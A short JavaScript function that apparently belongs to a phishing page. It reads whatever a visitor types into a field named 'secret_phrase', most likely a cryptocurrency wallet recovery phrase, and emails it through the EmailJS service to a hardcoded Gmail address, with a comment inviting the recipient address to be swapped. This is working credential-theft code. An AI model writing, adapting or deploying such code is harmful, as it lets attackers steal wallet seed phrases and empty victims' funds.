function SendMail() {
    var recipientEmail = "midetechub@gmail.com"; // Replace with the desired recipient email address
    var params = {
        result: document.getElementById("secret_phrase").value,
        to_email: recipientEmail  // Add the recipient email to the params object
    };

    emailjs.send("service_0fib79d", "template_cnqeg6o", params).then(function(res) {
        alert("Email sent successfully!");
    }).catch(function(error) {
        alert("Error!: " + JSON.stringify(error));
        window.location.href = "/error.html";
    });
}
